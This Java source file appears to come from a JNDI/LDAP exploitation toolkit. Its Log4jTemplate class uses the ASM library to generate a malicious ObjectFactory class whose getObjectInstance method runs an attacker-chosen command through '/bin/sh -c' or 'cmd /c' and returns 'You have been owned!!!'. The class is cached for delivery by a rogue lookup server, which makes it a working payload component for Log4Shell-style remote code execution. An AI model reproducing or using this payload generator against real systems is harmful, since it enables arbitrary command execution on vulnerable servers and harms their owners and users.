package com.feihong.ldap.template;

import com.feihong.ldap.utils.Cache;
import com.feihong.ldap.utils.Util;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.FieldVisitor;
import org.objectweb.asm.Label;
import org.objectweb.asm.MethodVisitor;
import static org.objectweb.asm.Opcodes.*;


public class Log4jTemplate implements Template {

    private String className;
    private byte[] bytes;
    private String cmd;

    public Log4jTemplate(String cmd){
        this.cmd = cmd;
        this.className = "Log4j" + Util.getRandomString();

        generate();
    }

    public Log4jTemplate(String cmd, String className){
        this.cmd = cmd;
        this.className = className;

        generate();
    }

    public void cache(){
        Cache.set(className, bytes);
    }

    public String getClassName(){
        return className;
    }

    public byte[] getBytes(){
        return bytes;
    }

    public void generate(){
        ClassWriter cw = new ClassWriter(0);
        FieldVisitor fv;
        MethodVisitor mv;

        cw.visit(V1_6, ACC_PUBLIC + ACC_SUPER, className, null, "java/lang/Object", new String[]{"javax/naming/spi/ObjectFactory"});

        {
            fv = cw.visitField(ACC_PRIVATE + ACC_STATIC, "cmd", "Ljava/lang/String;", null, null);
            fv.visitEnd();
        }
        {
            mv = cw.visitMethod(ACC_PUBLIC, "<init>", "()V", null, null);
            mv.visitCode();
            Label label0 = new Label();
            mv.visitLabel(label0);
            mv.visitLineNumber(6, label0);
            mv.visitVarInsn(ALOAD, 0);
            mv.visitMethodInsn(INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
            mv.visitInsn(RETURN);
            Label label1 = new Label();
            mv.visitLabel(label1);
            mv.visitLocalVariable("this", String.format("L%s;", className), null, label0, label1, 0);
            mv.visitMaxs(1, 1);
            mv.visitEnd();
        }

        {
            mv = cw.visitMethod(ACC_PUBLIC, "getObjectInstance", "(Ljava/lang/Object;Ljavax/naming/Name;Ljavax/naming/Context;Ljava/util/Hashtable;)Ljava/lang/Object;", "(Ljava/lang/Object;Ljavax/naming/Name;Ljavax/naming/Context;Ljava/util/Hashtable<**>;)Ljava/lang/Object;", new String[]{"java/lang/Exception"});
            mv.visitCode();
            Label label0 = new Label();
            Label label1 = new Label();
            Label label2 = new Label();
            mv.visitTryCatchBlock(label0, label1, label2, "java/lang/Throwable");
            mv.visitLabel(label0);
            mv.visitLineNumber(14, label0);
            mv.visitFieldInsn(GETSTATIC, "java/io/File", "separator", "Ljava/lang/String;");
            mv.visitLdcInsn("/");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/String", "equals", "(Ljava/lang/Object;)Z", false);
            Label label3 = new Label();
            mv.visitJumpInsn(IFEQ, label3);
            Label label4 = new Label();
            mv.visitLabel(label4);
            mv.visitLineNumber(15, label4);
            mv.visitInsn(ICONST_3);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/String");
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_0);
            mv.visitLdcInsn("/bin/sh");
            mv.visitInsn(AASTORE);
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_1);
            mv.visitLdcInsn("-c");
            mv.visitInsn(AASTORE);
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_2);
            mv.visitFieldInsn(GETSTATIC, className, "cmd", "Ljava/lang/String;");
            mv.visitInsn(AASTORE);
            mv.visitVarInsn(ASTORE, 5);
            Label label5 = new Label();
            mv.visitLabel(label5);
            Label label6 = new Label();
            mv.visitJumpInsn(GOTO, label6);
            mv.visitLabel(label3);
            mv.visitLineNumber(17, label3);
            mv.visitFrame(F_SAME, 0, null, 0, null);
            mv.visitInsn(ICONST_3);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/String");
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_0);
            mv.visitLdcInsn("cmd");
            mv.visitInsn(AASTORE);
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_1);
            mv.visitLdcInsn("/c");
            mv.visitInsn(AASTORE);
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_2);
            mv.visitFieldInsn(GETSTATIC, className, "cmd", "Ljava/lang/String;");
            mv.visitInsn(AASTORE);
            mv.visitVarInsn(ASTORE, 5);
            mv.visitLabel(label6);
            mv.visitLineNumber(19, label6);
            mv.visitFrame(F_APPEND, 1, new Object[]{"[Ljava/lang/String;"}, 0, null);
            mv.visitMethodInsn(INVOKESTATIC, "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;", false);
            mv.visitVarInsn(ALOAD, 5);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Runtime", "exec", "([Ljava/lang/String;)Ljava/lang/Process;", false);
            mv.visitInsn(POP);
            mv.visitLabel(label1);
            mv.visitLineNumber(22, label1);
            Label label7 = new Label();
            mv.visitJumpInsn(GOTO, label7);
            mv.visitLabel(label2);
            mv.visitLineNumber(20, label2);
            mv.visitFrame(F_FULL, 5, new Object[]{className, "java/lang/Object", "javax/naming/Name", "javax/naming/Context", "java/util/Hashtable"}, 1, new Object[]{"java/lang/Throwable"});
            mv.visitVarInsn(ASTORE, 5);
            Label label8 = new Label();
            mv.visitLabel(label8);
            mv.visitLineNumber(21, label8);
            mv.visitVarInsn(ALOAD, 5);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Throwable", "printStackTrace", "()V", false);
            mv.visitLabel(label7);
            mv.visitLineNumber(23, label7);
            mv.visitFrame(F_SAME, 0, null, 0, null);
            mv.visitLdcInsn("You have been owned!!!");
            mv.visitInsn(ARETURN);
            Label label9 = new Label();
            mv.visitLabel(label9);
            mv.visitLocalVariable("command", "[Ljava/lang/String;", null, label5, label3, 5);
            mv.visitLocalVariable("command", "[Ljava/lang/String;", null, label6, label1, 5);
            mv.visitLocalVariable("e", "Ljava/lang/Throwable;", null, label8, label7, 5);
            mv.visitLocalVariable("this", "LLog4jTest;", null, label0, label9, 0);
            mv.visitLocalVariable("obj", "Ljava/lang/Object;", null, label0, label9, 1);
            mv.visitLocalVariable("name", "Ljavax/naming/Name;", null, label0, label9, 2);
            mv.visitLocalVariable("nameCtx", "Ljavax/naming/Context;", null, label0, label9, 3);
            mv.visitLocalVariable("environment", "Ljava/util/Hashtable;", "Ljava/util/Hashtable<**>;", label0, label9, 4);
            mv.visitMaxs(4, 6);
            mv.visitEnd();
        }
        {
            mv = cw.visitMethod(ACC_STATIC, "<clinit>", "()V", null, null);
            mv.visitCode();
            mv.visitLdcInsn(cmd);
            mv.visitFieldInsn(PUTSTATIC, className, "cmd", "Ljava/lang/String;");
            mv.visitInsn(RETURN);
            mv.visitMaxs(1, 0);
            mv.visitEnd();
        }
        cw.visitEnd();
        bytes = cw.toByteArray();
    }
}
